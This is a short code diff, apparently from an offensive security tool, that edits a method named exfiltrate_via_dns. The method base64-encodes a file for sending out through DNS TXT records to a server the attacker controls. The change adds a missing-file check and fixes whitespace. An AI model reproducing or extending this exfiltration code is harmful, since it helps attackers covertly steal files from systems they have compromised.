@@ -41,9 +41,11 @@ class Exfiltration:
     def exfiltrate_via_dns(domain, filepath, on_output=None):
         """Exfiltrate data via DNS TXT records (Staged)."""
         # Note: Needs a controlled authoritative DNS server
+        if not os.path.exists(filepath):
+            return f"[ERROR] FILE_NOT_FOUND: {filepath}"
         if on_output:
             on_output(f"[EXFIL] ENCODING_FILE_FOR_DNS_TUNNELING: {filepath}")
-        
+
         with open(filepath, 'rb') as f:
             encoded = base64.b64encode(f.read()).decode()
         
